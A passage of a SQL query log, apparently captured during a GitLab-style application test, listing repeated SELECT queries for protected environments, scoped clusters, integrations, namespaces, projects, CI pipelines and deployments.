\"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\", \"base_and_ancestors\" WHERE \"namespaces\".\"type\" = 'Group' AND \"namespaces\".\"id\" = \"base_and_ancestors\".\"parent_id\")) SELECT \"id\" FROM \"base_and_ancestors\" AS \"namespaces\" /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"protected_environments\".* FROM \"protected_environments\" WHERE \"protected_environments\".\"project_id\" = 371 AND \"protected_environments\".\"name\" IN ('environment1', 'environment2', 'environment3') /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"protected_environment_deploy_access_levels\".* FROM \"protected_environment_deploy_access_levels\" WHERE \"protected_environment_deploy_access_levels\".\"protected_environment_id\" IN (8, 9, 10) /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       WITH RECURSIVE \"clusters_cte\" AS ((SELECT \"clusters\".*, NULL AS group_parent_id, 0 AS depth FROM \"clusters\" INNER JOIN \"cluster_projects\" ON \"cluster_projects\".\"cluster_id\" = \"clusters\".\"id\" INNER JOIN \"projects\" ON \"projects\".\"id\" = \"cluster_projects\".\"project_id\" WHERE \"clusters\".\"management_project_id\" = 371 AND \"clusters\".\"cluster_type\" = 3 AND \"projects\".\"namespace_id\" = 848)\n       UNION\n       (SELECT \"clusters\".*, \"projects\".\"namespace_id\" AS group_parent_id, 1 AS depth FROM \"projects\" LEFT OUTER JOIN \"cluster_projects\" ON \"cluster_projects\".\"project_id\" = \"projects\".\"id\" LEFT OUTER JOIN \"clusters\" ON \"clusters\".\"id\" = \"cluster_projects\".\"cluster_id\" WHERE \"projects\".\"id\" = 371)\n       UNION\n       (SELECT \"clusters\".*, \"namespaces\".\"parent_id\" AS group_parent_id, (\"clusters_cte\".\"depth\" + 1) FROM \"clusters_cte\", \"namespaces\" LEFT OUTER JOIN cluster_groups ON cluster_groups.group_id = namespaces.id LEFT OUTER JOIN clusters ON cluster_groups.cluster_id = clusters.id WHERE \"namespaces\".\"id\" = \"clusters_cte\".\"group_parent_id\")) SELECT \"clusters\".* FROM \"clusters_cte\" \"clusters\" WHERE \"clusters\".\"id\" IS NOT NULL AND \"clusters\".\"enabled\" = TRUE AND (environment_scope IN ('*', 'environment1') OR\n         'environment1' LIKE\n           REPLACE(REPLACE(REPLACE(environment_scope,\n                               '%', '\\%'),\n                       '_', '\\_'),\n               '*', '%')\n\n       ) ORDER BY (CASE clusters.management_project_id\n         WHEN 371 THEN 0\n         ELSE depth\n       END) ASC\n       , CASE environment_scope\n         WHEN '*' THEN 0\n         WHEN 'environment1' THEN 2\n         ELSE 1\n       END DESC\n        LIMIT 1 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"clusters\".* FROM \"clusters\" WHERE \"clusters\".\"cluster_type\" = 1 AND \"clusters\".\"enabled\" = TRUE AND (environment_scope IN ('*', 'environment1') OR\n         'environment1' LIKE\n           REPLACE(REPLACE(REPLACE(environment_scope,\n                               '%', '\\%'),\n                       '_', '\\_'),\n               '*', '%')\n\n       ) ORDER BY CASE environment_scope\n         WHEN '*' THEN 0\n         WHEN 'environment1' THEN 2\n         ELSE 1\n       END DESC\n        LIMIT 1 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"integrations\".\"id\", \"integrations\".\"project_id\", \"integrations\".\"created_at\", \"integrations\".\"updated_at\", \"integrations\".\"active\", \"integrations\".\"properties\", \"integrations\".\"push_events\", \"integrations\".\"issues_events\", \"integrations\".\"merge_requests_events\", \"integrations\".\"tag_push_events\", \"integrations\".\"note_events\", \"integrations\".\"category\", \"integrations\".\"wiki_page_events\", \"integrations\".\"pipeline_events\", \"integrations\".\"confidential_issues_events\", \"integrations\".\"commit_events\", \"integrations\".\"job_events\", \"integrations\".\"confidential_note_events\", \"integrations\".\"deployment_events\", \"integrations\".\"comment_on_event_enabled\", \"integrations\".\"instance\", \"integrations\".\"comment_detail\", \"integrations\".\"inherit_from_id\", \"integrations\".\"alert_events\", \"integrations\".\"group_id\", \"integrations\".\"type_new\", \"integrations\".\"vulnerability_events\", \"integrations\".\"archive_trace_events\", \"integrations\".\"encrypted_properties\", \"integrations\".\"encrypted_properties_iv\" FROM \"integrations\" WHERE \"integrations\".\"project_id\" = 371 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"integrations\".\"id\", \"integrations\".\"project_id\", \"integrations\".\"created_at\", \"integrations\".\"updated_at\", \"integrations\".\"active\", \"integrations\".\"properties\", \"integrations\".\"push_events\", \"integrations\".\"issues_events\", \"integrations\".\"merge_requests_events\", \"integrations\".\"tag_push_events\", \"integrations\".\"note_events\", \"integrations\".\"category\", \"integrations\".\"wiki_page_events\", \"integrations\".\"pipeline_events\", \"integrations\".\"confidential_issues_events\", \"integrations\".\"commit_events\", \"integrations\".\"job_events\", \"integrations\".\"confidential_note_events\", \"integrations\".\"deployment_events\", \"integrations\".\"comment_on_event_enabled\", \"integrations\".\"instance\", \"integrations\".\"comment_detail\", \"integrations\".\"inherit_from_id\", \"integrations\".\"alert_events\", \"integrations\".\"group_id\", \"integrations\".\"type_new\", \"integrations\".\"vulnerability_events\", \"integrations\".\"archive_trace_events\", \"integrations\".\"encrypted_properties\", \"integrations\".\"encrypted_properties_iv\" FROM \"integrations\" WHERE \"integrations\".\"instance\" = TRUE AND \"integrations\".\"type_new\" IN ('Integrations::Asana', 'Integrations::Assembla', 'Integrations::Bamboo', 'Integrations::Bugzilla', 'Integrations::Buildkite', 'Integrations::Campfire', 'Integrations::Confluence', 'Integrations::CustomIssueTracker', 'Integrations::Datadog', 'Integrations::Discord', 'Integrations::DroneCi', 'Integrations::EmailsOnPush', 'Integrations::Ewm', 'Integrations::ExternalWiki', 'Integrations::Flowdock', 'Integrations::HangoutsChat', 'Integrations::Harbor', 'Integrations::Irker', 'Integrations::Jira', 'Integrations::Mattermost', 'Integrations::MattermostSlashCommands', 'Integrations::MicrosoftTeams', 'Integrations::Packagist', 'Integrations::PipelinesEmail', 'Integrations::Pivotaltracker', 'Integrations::Prometheus', 'Integrations::Pushover', 'Integrations::Redmine', 'Integrations::Slack', 'Integrations::SlackSlashCommands', 'Integrations::Teamcity', 'Integrations::UnifyCircuit', 'Integrations::WebexTeams', 'Integrations::Youtrack', 'Integrations::Zentao') /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"id\" = 848 LIMIT 1 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"routes\".* FROM \"routes\" WHERE \"routes\".\"source_id\" = 848 AND \"routes\".\"source_type\" = 'Namespace' LIMIT 1 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (SELECT \"ci_builds\".\"commit_id\" FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"id\" = 259 LIMIT 1) LIMIT 1 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (SELECT \"ci_builds\".\"commit_id\" FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"id\" = 259 LIMIT 1) LIMIT 1 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"ci_builds\".\"id\" FROM \"ci_builds\" INNER JOIN \"ci_builds_metadata\" ON \"ci_builds_metadata\".\"build_id\" = \"ci_builds\".\"id\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"commit_id\" = 214 AND (\"ci_builds\".\"retried\" = FALSE OR \"ci_builds\".\"retried\" IS NULL) /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (SELECT \"ci_builds\".\"commit_id\" FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"id\" = 259 LIMIT 1) LIMIT 1 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (SELECT \"ci_builds\".\"commit_id\" FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"id\" = 259 LIMIT 1) LIMIT 1 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"ci_builds\".\"id\" FROM \"ci_builds\" INNER JOIN \"ci_builds_metadata\" ON \"ci_builds_metadata\".\"build_id\" = \"ci_builds\".\"id\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"commit_id\" = 214 AND (\"ci_builds\".\"retried\" = FALSE OR \"ci_builds\".\"retried\" IS NULL) /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"deployments\".* FROM \"deployments\" WHERE \"deployments\".\"status\" = 2 AND \"deployments\".\"environment_id\" = 395 AND \"deployments\".\"deployable_id\" = 259 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"namespaces\".\"id\", \"namespaces\".\"name\", \"namespaces\".\"path\", \"namespaces\".\"owner_id\", \"namespaces\".\"created_at\", \"namespaces\".\"updated_at\", \"namespaces\".\"type\", \"namespaces\".\"description\", \"namespaces\".\"avatar\", \"namespaces\".\"membership_lock\", \"namespaces\".\"share_with_group_lock\", \"namespaces\".\"visibility_level\", \"namespaces\".\"request_access_enabled\", \"namespaces\".\"ldap_sync_status\", \"namespaces\".\"ldap_sync_error\", \"namespaces\".\"ldap_sync_last_update_at\", \"namespaces\".\"ldap_sync_last_successful_update_at\", \"namespaces\".\"ldap_sync_last_sync_at\", \"namespaces\".\"description_html\", \"namespaces\".\"lfs_enabled\", \"namespaces\".\"parent_id\", \"namespaces\".\"shared_runners_minutes_limit\", \"namespaces\".\"repository_size_limit\", \"namespaces\".\"require_two_factor_authentication\", \"namespaces\".\"two_factor_grace_period\", \"namespaces\".\"cached_markdown_version\", \"namespaces\".\"project_creation_level\", \"namespaces\".\"runners_token\", \"namespaces\".\"file_template_project_id\", \"namespaces\".\"saml_discovery_token\", \"namespaces\".\"runners_token_encrypted\", \"namespaces\".\"custom_project_templates_group_id\", \"namespaces\".\"auto_devops_enabled\", \"namespaces\".\"extra_shared_runners_minutes_limit\", \"namespaces\".\"last_ci_minutes_notification_at\", \"namespaces\".\"last_ci_minutes_usage_notification_level\", \"namespaces\".\"subgroup_creation_level\", \"namespaces\".\"emails_disabled\", \"namespaces\".\"max_pages_size\", \"namespaces\".\"max_artifacts_size\", \"namespaces\".\"mentions_disabled\", \"namespaces\".\"default_branch_protection\", \"namespaces\".\"unlock_membership_to_ldap\", \"namespaces\".\"max_personal_access_token_lifetime\", \"namespaces\".\"push_rule_id\", \"namespaces\".\"shared_runners_enabled\", \"namespaces\".\"allow_descendants_override_disabled_shared_runners\", \"namespaces\".\"traversal_ids\" FROM \"namespaces\" WHERE \"namespaces\".\"id\" = 848 LIMIT 1 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"routes\".* FROM \"routes\" WHERE \"routes\".\"source_id\" = 848 AND \"routes\".\"source_type\" = 'Namespace' LIMIT 1 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       WITH RECURSIVE \"clusters_cte\" AS ((SELECT \"clusters\".*, NULL AS group_parent_id, 0 AS depth FROM \"clusters\" INNER JOIN \"cluster_projects\" ON \"cluster_projects\".\"cluster_id\" = \"clusters\".\"id\" INNER JOIN \"projects\" ON \"projects\".\"id\" = \"cluster_projects\".\"project_id\" WHERE \"clusters\".\"management_project_id\" = 371 AND \"clusters\".\"cluster_type\" = 3 AND \"projects\".\"namespace_id\" = 848)\n       UNION\n       (SELECT \"clusters\".*, \"projects\".\"namespace_id\" AS group_parent_id, 1 AS depth FROM \"projects\" LEFT OUTER JOIN \"cluster_projects\" ON \"cluster_projects\".\"project_id\" = \"projects\".\"id\" LEFT OUTER JOIN \"clusters\" ON \"clusters\".\"id\" = \"cluster_projects\".\"cluster_id\" WHERE \"projects\".\"id\" = 371)\n       UNION\n       (SELECT \"clusters\".*, \"namespaces\".\"parent_id\" AS group_parent_id, (\"clusters_cte\".\"depth\" + 1) FROM \"clusters_cte\", \"namespaces\" LEFT OUTER JOIN cluster_groups ON cluster_groups.group_id = namespaces.id LEFT OUTER JOIN clusters ON cluster_groups.cluster_id = clusters.id WHERE \"namespaces\".\"id\" = \"clusters_cte\".\"group_parent_id\")) SELECT \"clusters\".* FROM \"clusters_cte\" \"clusters\" WHERE \"clusters\".\"id\" IS NOT NULL AND \"clusters\".\"enabled\" = TRUE AND (environment_scope IN ('*', 'environment2') OR\n         'environment2' LIKE\n           REPLACE(REPLACE(REPLACE(environment_scope,\n                               '%', '\\%'),\n                       '_', '\\_'),\n               '*', '%')\n\n       ) ORDER BY (CASE clusters.management_project_id\n         WHEN 371 THEN 0\n         ELSE depth\n       END) ASC\n       , CASE environment_scope\n         WHEN '*' THEN 0\n         WHEN 'environment2' THEN 2\n         ELSE 1\n       END DESC\n        LIMIT 1 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"clusters\".* FROM \"clusters\" WHERE \"clusters\".\"cluster_type\" = 1 AND \"clusters\".\"enabled\" = TRUE AND (environment_scope IN ('*', 'environment2') OR\n         'environment2' LIKE\n           REPLACE(REPLACE(REPLACE(environment_scope,\n                               '%', '\\%'),\n                       '_', '\\_'),\n               '*', '%')\n\n       ) ORDER BY CASE environment_scope\n         WHEN '*' THEN 0\n         WHEN 'environment2' THEN 2\n         ELSE 1\n       END DESC\n        LIMIT 1 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"projects\".\"id\", \"projects\".\"name\", \"projects\".\"path\", \"projects\".\"description\", \"projects\".\"created_at\", \"projects\".\"updated_at\", \"projects\".\"creator_id\", \"projects\".\"namespace_id\", \"projects\".\"last_activity_at\", \"projects\".\"import_url\", \"projects\".\"visibility_level\", \"projects\".\"archived\", \"projects\".\"avatar\", \"projects\".\"merge_requests_template\", \"projects\".\"star_count\", \"projects\".\"merge_requests_rebase_enabled\", \"projects\".\"import_type\", \"projects\".\"import_source\", \"projects\".\"approvals_before_merge\", \"projects\".\"reset_approvals_on_push\", \"projects\".\"merge_requests_ff_only_enabled\", \"projects\".\"issues_template\", \"projects\".\"mirror\", \"projects\".\"mirror_user_id\", \"projects\".\"shared_runners_enabled\", \"projects\".\"runners_token\", \"projects\".\"build_coverage_regex\", \"projects\".\"build_allow_git_fetch\", \"projects\".\"build_timeout\", \"projects\".\"mirror_trigger_builds\", \"projects\".\"pending_delete\", \"projects\".\"public_builds\", \"projects\".\"last_repository_check_failed\", \"projects\".\"last_repository_check_at\", \"projects\".\"only_allow_merge_if_pipeline_succeeds\", \"projects\".\"has_external_issue_tracker\", \"projects\".\"repository_storage\", \"projects\".\"repository_read_only\", \"projects\".\"request_access_enabled\", \"projects\".\"has_external_wiki\", \"projects\".\"ci_config_path\", \"projects\".\"lfs_enabled\", \"projects\".\"description_html\", \"projects\".\"only_allow_merge_if_all_discussions_are_resolved\", \"projects\".\"repository_size_limit\", \"projects\".\"printing_merge_request_link_enabled\", \"projects\".\"auto_cancel_pending_pipelines\", \"projects\".\"service_desk_enabled\", \"projects\".\"cached_markdown_version\", \"projects\".\"delete_error\", \"projects\".\"last_repository_updated_at\", \"projects\".\"disable_overriding_approvers_per_merge_request\", \"projects\".\"storage_version\", \"projects\".\"resolve_outdated_diff_discussions\", \"projects\".\"remote_mirror_available_overridden\", \"projects\".\"only_mirror_protected_branches\", \"projects\".\"pull_mirror_available_overridden\", \"projects\".\"jobs_cache_index\", \"projects\".\"external_authorization_classification_label\", \"projects\".\"mirror_overwrites_diverged_branches\", \"projects\".\"pages_https_only\", \"projects\".\"external_webhook_token\", \"projects\".\"packages_enabled\", \"projects\".\"merge_requests_author_approval\", \"projects\".\"pool_repository_id\", \"projects\".\"runners_token_encrypted\", \"projects\".\"bfg_object_map\", \"projects\".\"detected_repository_languages\", \"projects\".\"merge_requests_disable_committers_approval\", \"projects\".\"require_password_to_approve\", \"projects\".\"emails_disabled\", \"projects\".\"max_pages_size\", \"projects\".\"max_artifacts_size\", \"projects\".\"remove_source_branch_after_merge\", \"projects\".\"marked_for_deletion_at\", \"projects\".\"marked_for_deletion_by_user_id\", \"projects\".\"autoclose_referenced_issues\", \"projects\".\"suggestion_commit_message\", \"projects\".\"project_namespace_id\", \"projects\".\"hidden\" FROM \"projects\" WHERE \"projects\".\"id\" = 371 LIMIT 1 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (SELECT \"ci_builds\".\"commit_id\" FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"id\" = 261 LIMIT 1) LIMIT 1 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (SELECT \"ci_builds\".\"commit_id\" FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"id\" = 261 LIMIT 1) LIMIT 1 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"ci_builds\".\"id\" FROM \"ci_builds\" INNER JOIN \"ci_builds_metadata\" ON \"ci_builds_metadata\".\"build_id\" = \"ci_builds\".\"id\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"commit_id\" = 216 AND (\"ci_builds\".\"retried\" = FALSE OR \"ci_builds\".\"retried\" IS NULL) /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (SELECT \"ci_builds\".\"commit_id\" FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"id\" = 261 LIMIT 1) LIMIT 1 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (SELECT \"ci_builds\".\"commit_id\" FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"id\" = 261 LIMIT 1) LIMIT 1 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"ci_builds\".\"id\" FROM \"ci_builds\" INNER JOIN \"ci_builds_metadata\" ON \"ci_builds_metadata\".\"build_id\" = \"ci_builds\".\"id\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"commit_id\" = 216 AND (\"ci_builds\".\"retried\" = FALSE OR \"ci_builds\".\"retried\" IS NULL) /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"deployments\".* FROM \"deployments\" WHERE \"deployments\".\"status\" = 2 AND \"deployments\".\"environment_id\" = 396 AND \"deployments\".\"deployable_id\" = 261 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       WITH RECURSIVE \"clusters_cte\" AS ((SELECT \"clusters\".*, NULL AS group_parent_id, 0 AS depth FROM \"clusters\" INNER JOIN \"cluster_projects\" ON \"cluster_projects\".\"cluster_id\" = \"clusters\".\"id\" INNER JOIN \"projects\" ON \"projects\".\"id\" = \"cluster_projects\".\"project_id\" WHERE \"clusters\".\"management_project_id\" = 371 AND \"clusters\".\"cluster_type\" = 3 AND \"projects\".\"namespace_id\" = 848)\n       UNION\n       (SELECT \"clusters\".*, \"projects\".\"namespace_id\" AS group_parent_id, 1 AS depth FROM \"projects\" LEFT OUTER JOIN \"cluster_projects\" ON \"cluster_projects\".\"project_id\" = \"projects\".\"id\" LEFT OUTER JOIN \"clusters\" ON \"clusters\".\"id\" = \"cluster_projects\".\"cluster_id\" WHERE \"projects\".\"id\" = 371)\n       UNION\n       (SELECT \"clusters\".*, \"namespaces\".\"parent_id\" AS group_parent_id, (\"clusters_cte\".\"depth\" + 1) FROM \"clusters_cte\", \"namespaces\" LEFT OUTER JOIN cluster_groups ON cluster_groups.group_id = namespaces.id LEFT OUTER JOIN clusters ON cluster_groups.cluster_id = clusters.id WHERE \"namespaces\".\"id\" = \"clusters_cte\".\"group_parent_id\")) SELECT \"clusters\".* FROM \"clusters_cte\" \"clusters\" WHERE \"clusters\".\"id\" IS NOT NULL AND \"clusters\".\"enabled\" = TRUE AND (environment_scope IN ('*', 'environment3') OR\n         'environment3' LIKE\n           REPLACE(REPLACE(REPLACE(environment_scope,\n                               '%', '\\%'),\n                       '_', '\\_'),\n               '*', '%')\n\n       ) ORDER BY (CASE clusters.management_project_id\n         WHEN 371 THEN 0\n         ELSE depth\n       END) ASC\n       , CASE environment_scope\n         WHEN '*' THEN 0\n         WHEN 'environment3' THEN 2\n         ELSE 1\n       END DESC\n        LIMIT 1 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"clusters\".* FROM \"clusters\" WHERE \"clusters\".\"cluster_type\" = 1 AND \"clusters\".\"enabled\" = TRUE AND (environment_scope IN ('*', 'environment3') OR\n         'environment3' LIKE\n           REPLACE(REPLACE(REPLACE(environment_scope,\n                               '%', '\\%'),\n                       '_', '\\_'),\n               '*', '%')\n\n       ) ORDER BY CASE environment_scope\n         WHEN '*' THEN 0\n         WHEN 'environment3' THEN 2\n         ELSE 1\n       END DESC\n        LIMIT 1 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"projects\".\"id\", \"projects\".\"name\", \"projects\".\"path\", \"projects\".\"description\", \"projects\".\"created_at\", \"projects\".\"updated_at\", \"projects\".\"creator_id\", \"projects\".\"namespace_id\", \"projects\".\"last_activity_at\", \"projects\".\"import_url\", \"projects\".\"visibility_level\", \"projects\".\"archived\", \"projects\".\"avatar\", \"projects\".\"merge_requests_template\", \"projects\".\"star_count\", \"projects\".\"merge_requests_rebase_enabled\", \"projects\".\"import_type\", \"projects\".\"import_source\", \"projects\".\"approvals_before_merge\", \"projects\".\"reset_approvals_on_push\", \"projects\".\"merge_requests_ff_only_enabled\", \"projects\".\"issues_template\", \"projects\".\"mirror\", \"projects\".\"mirror_user_id\", \"projects\".\"shared_runners_enabled\", \"projects\".\"runners_token\", \"projects\".\"build_coverage_regex\", \"projects\".\"build_allow_git_fetch\", \"projects\".\"build_timeout\", \"projects\".\"mirror_trigger_builds\", \"projects\".\"pending_delete\", \"projects\".\"public_builds\", \"projects\".\"last_repository_check_failed\", \"projects\".\"last_repository_check_at\", \"projects\".\"only_allow_merge_if_pipeline_succeeds\", \"projects\".\"has_external_issue_tracker\", \"projects\".\"repository_storage\", \"projects\".\"repository_read_only\", \"projects\".\"request_access_enabled\", \"projects\".\"has_external_wiki\", \"projects\".\"ci_config_path\", \"projects\".\"lfs_enabled\", \"projects\".\"description_html\", \"projects\".\"only_allow_merge_if_all_discussions_are_resolved\", \"projects\".\"repository_size_limit\", \"projects\".\"printing_merge_request_link_enabled\", \"projects\".\"auto_cancel_pending_pipelines\", \"projects\".\"service_desk_enabled\", \"projects\".\"cached_markdown_version\", \"projects\".\"delete_error\", \"projects\".\"last_repository_updated_at\", \"projects\".\"disable_overriding_approvers_per_merge_request\", \"projects\".\"storage_version\", \"projects\".\"resolve_outdated_diff_discussions\", \"projects\".\"remote_mirror_available_overridden\", \"projects\".\"only_mirror_protected_branches\", \"projects\".\"pull_mirror_available_overridden\", \"projects\".\"jobs_cache_index\", \"projects\".\"external_authorization_classification_label\", \"projects\".\"mirror_overwrites_diverged_branches\", \"projects\".\"pages_https_only\", \"projects\".\"external_webhook_token\", \"projects\".\"packages_enabled\", \"projects\".\"merge_requests_author_approval\", \"projects\".\"pool_repository_id\", \"projects\".\"runners_token_encrypted\", \"projects\".\"bfg_object_map\", \"projects\".\"detected_repository_languages\", \"projects\".\"merge_requests_disable_committers_approval\", \"projects\".\"require_password_to_approve\", \"projects\".\"emails_disabled\", \"projects\".\"max_pages_size\", \"projects\".\"max_artifacts_size\", \"projects\".\"remove_source_branch_after_merge\", \"projects\".\"marked_for_deletion_at\", \"projects\".\"marked_for_deletion_by_user_id\", \"projects\".\"autoclose_referenced_issues\", \"projects\".\"suggestion_commit_message\", \"projects\".\"project_namespace_id\", \"projects\".\"hidden\" FROM \"projects\" WHERE \"projects\".\"id\" = 371 LIMIT 1 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:main*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (SELECT \"ci_builds\".\"commit_id\" FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"id\" = 263 LIMIT 1) LIMIT 1 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (SELECT \"ci_builds\".\"commit_id\" FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"id\" = 263 LIMIT 1) LIMIT 1 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"ci_builds\".\"id\" FROM \"ci_builds\" INNER JOIN \"ci_builds_metadata\" ON \"ci_builds_metadata\".\"build_id\" = \"ci_builds\".\"id\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"commit_id\" = 218 AND (\"ci_builds\".\"retried\" = FALSE OR \"ci_builds\".\"retried\" IS NULL) /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (SELECT \"ci_builds\".\"commit_id\" FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"id\" = 263 LIMIT 1) LIMIT 1 /*application:test,correlation_id:c36713b8dcad8649dbfdf0f629b3750d,db_config_name:ci*/\n\n       SELECT \"ci_pipelines\".* FROM \"ci_pipelines\" WHERE \"ci_pipelines\".\"id\" IN (SELECT \"ci_builds\".\"commit_id\" FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' AND \"ci_builds\".\"id\" = 263 LIMIT 1) LIMIT 1 